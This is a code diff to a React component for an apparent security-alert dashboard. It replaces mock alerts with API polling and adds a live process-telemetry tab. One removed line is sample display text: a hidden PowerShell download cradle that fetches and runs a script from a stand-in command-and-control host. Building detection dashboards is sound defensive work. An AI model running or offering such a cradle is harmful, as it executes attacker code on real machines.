@@ -1,21 +1,18 @@
 import React, { useState, useEffect } from 'react';
-import { Send, Terminal, Shield } from 'lucide-react';
+import { Send, Terminal, Shield, Activity } from 'lucide-react';
 
-const mockAlerts = [
-    { id: 1, time: '03:43:42', severity: 'HIGH', rule: 'Suspicious Office Child Process', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
-    { id: 2, time: '03:43:42', severity: 'CRITICAL', rule: 'Suspicious Download Cradle', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
-    { id: 3, time: '03:42:42', severity: 'HIGH', rule: 'Suspicious Office Child Process', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
-    { id: 4, time: '03:42:42', severity: 'CRITICAL', rule: 'Suspicious Download Cradle', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
-    { id: 5, time: '03:37:42', severity: 'HIGH', rule: 'Suspicious Office Child Process', host: 'SEC-WKSTN-01', status: 'ACKNOWLEDGE' },
-];
+const API_URL = 'http://localhost:5001/api';
 
 const Intelligence = () => {
+    const [activeTab, setActiveTab] = useState('alerts'); // 'alerts' or 'telemetry'
     const [alerts, setAlerts] = useState([]);
     const [selectedAlert, setSelectedAlert] = useState(null);
+    const [logs, setLogs] = useState([]);
     const [loading, setLoading] = useState(true);
 
+    // Fetch alerts
     const fetchAlerts = () => {
-        fetch('http://localhost:5001/api/alerts')
+        fetch(`${API_URL}/alerts`)
             .then(res => res.json())
             .then(data => {
                 setAlerts(data);
@@ -25,39 +22,42 @@ const Intelligence = () => {
             .catch(err => console.error("Failed to fetch alerts:", err));
     };
 
+    // Fetch live telemetry logs
+    const fetchLogs = () => {
+        fetch(`${API_URL}/logs/all`)
+            .then(res => res.json())
+            .then(data => {
+                setLogs(data);
+                setLoading(false);
+            })
+            .catch(err => console.error("Failed to fetch logs:", err));
+    };
+
     useEffect(() => {
-        fetchAlerts();
-        // Poll every 10 seconds for real-time updates
-        const interval = setInterval(fetchAlerts, 10000);
-        return () => clearInterval(interval);
-    }, []);
+        if (activeTab === 'alerts') {
+            fetchAlerts();
+            const interval = setInterval(fetchAlerts, 10000);
+            return () => clearInterval(interval);
+        } else {
+            fetchLogs();
+            const interval = setInterval(fetchLogs, 5000); // More frequent for telemetry
+            return () => clearInterval(interval);
+        }
+    }, [activeTab]);
 
     const handleAcknowledge = async (id, e) => {
         e.stopPropagation();
         try {
-            await fetch(`http://localhost:5001/api/alerts/${id}/ack`, { method: 'POST' });
-            // Refresh local state to show 'open' status or remove from 'new' list if filtering
+            await fetch(`${API_URL}/alerts/${id}/ack`, { method: 'POST' });
             setAlerts(prev => prev.map(a => a.alert_id === id ? { ...a, status: 'open' } : a));
         } catch (err) {
             console.error("Ack failed", err);
         }
     };
 
-    return (
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
-
-            {/* Action Bar */}
-            <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
-                <button className="btn btn-primary" style={{ borderRadius: '20px', padding: '0.5rem 1.5rem', fontWeight: 600 }}>
-                    ACTIVE ALERTS ({alerts.length})
-                </button>
-                <button className="btn btn-ghost" style={{ borderRadius: '20px', color: 'var(--text-secondary)' }}>
-                    LIVE TELEMETRY
-                </button>
-            </div>
-
+    const renderAlerts = () => (
+        <>
             <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '24px' }}>
-
                 {/* Main List */}
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
                     <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
@@ -115,7 +115,7 @@ const Intelligence = () => {
                                 lineHeight: '1.5',
                                 minHeight: '150px'
                             }}>
-                                powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.io/p.ps1')"
+                                {selectedAlert?.description || 'Select an alert to view details'}
                             </div>
                         </div>
 
@@ -176,8 +176,97 @@ const Intelligence = () => {
                         </div>
                     </div>
                 </div>
-
             </div>
+        </>
+    );
+
+    const renderLiveTelemetry = () => (
+        <div className="card" style={{ padding: 0 }}>
+            <div style={{ padding: '20px', borderBottom: '1px solid var(--border-color)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                    <Activity size={20} color="var(--sentinel-green)" className="animate-pulse" />
+                    <span style={{ fontSize: '0.9rem', fontWeight: 600 }}>LIVE EVENT STREAM</span>
+                </div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.75rem', color: 'var(--sentinel-green)' }}>
+                    <div style={{ width: '6px', height: '6px', borderRadius: '50%', background: 'var(--sentinel-green)' }} className="animate-pulse"></div>
+                    REAL-TIME
+                </div>
+            </div>
+
+            <div style={{ maxHeight: '600px', overflowY: 'auto' }}>
+                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.85rem' }}>
+                    <thead style={{ position: 'sticky', top: 0, background: 'var(--bg-card)', zIndex: 1 }}>
+                        <tr style={{ borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)', textAlign: 'left' }}>
+                            <th style={{ padding: '16px', fontWeight: 600 }}>TIMESTAMP</th>
+                            <th style={{ padding: '16px', fontWeight: 600 }}>HOST</th>
+                            <th style={{ padding: '16px', fontWeight: 600 }}>PROCESS</th>
+                            <th style={{ padding: '16px', fontWeight: 600 }}>COMMAND LINE</th>
+                            <th style={{ padding: '16px', fontWeight: 600 }}>USER</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {logs.length === 0 ? (
+                            <tr>
+                                <td colSpan={5} style={{ padding: '40px', textAlign: 'center', color: 'var(--text-muted)' }}>
+                                    <Terminal size={32} style={{ margin: '0 auto 12px', opacity: 0.5 }} />
+                                    <div>No telemetry data available. Waiting for endpoint connections...</div>
+                                </td>
+                            </tr>
+                        ) : (
+                            logs.map((log, idx) => (
+                                <tr key={idx} style={{ borderBottom: '1px solid var(--border-color)', ':hover': { background: 'rgba(255,255,255,0.02)' } }}>
+                                    <td style={{ padding: '16px', fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--text-muted)' }}>
+                                        {new Date(log.timestamp).toLocaleTimeString()}
+                                    </td>
+                                    <td style={{ padding: '16px', fontWeight: 500 }}>{log.hostname}</td>
+                                    <td style={{ padding: '16px', fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--sentinel-blue)' }}>
+                                        {log.process_name}
+                                    </td>
+                                    <td style={{ padding: '16px', fontFamily: 'monospace', fontSize: '0.75rem', maxWidth: '400px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                                        {log.command_line || 'N/A'}
+                                    </td>
+                                    <td style={{ padding: '16px', fontSize: '0.8rem', color: 'var(--text-muted)' }}>{log.user_name}</td>
+                                </tr>
+                            ))
+                        )}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    );
+
+    return (
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
+            {/* Action Bar with Tabs */}
+            <div style={{ display: 'flex', gap: '16px', alignItems: 'center' }}>
+                <button
+                    className={activeTab === 'alerts' ? "btn btn-primary" : "btn btn-ghost"}
+                    onClick={() => setActiveTab('alerts')}
+                    style={{
+                        borderRadius: '20px',
+                        padding: '0.5rem 1.5rem',
+                        fontWeight: 600,
+                        color: activeTab !== 'alerts' ? 'var(--text-secondary)' : undefined
+                    }}
+                >
+                    ACTIVE ALERTS ({alerts.length})
+                </button>
+                <button
+                    className={activeTab === 'telemetry' ? "btn btn-primary" : "btn btn-ghost"}
+                    onClick={() => setActiveTab('telemetry')}
+                    style={{
+                        borderRadius: '20px',
+                        padding: '0.5rem 1.5rem',
+                        fontWeight: 600,
+                        color: activeTab !== 'telemetry' ? 'var(--text-secondary)' : undefined
+                    }}
+                >
+                    LIVE TELEMETRY
+                </button>
+            </div>
+
+            {/* Content */}
+            {activeTab === 'alerts' ? renderAlerts() : renderLiveTelemetry()}
         </div>
     );
 };
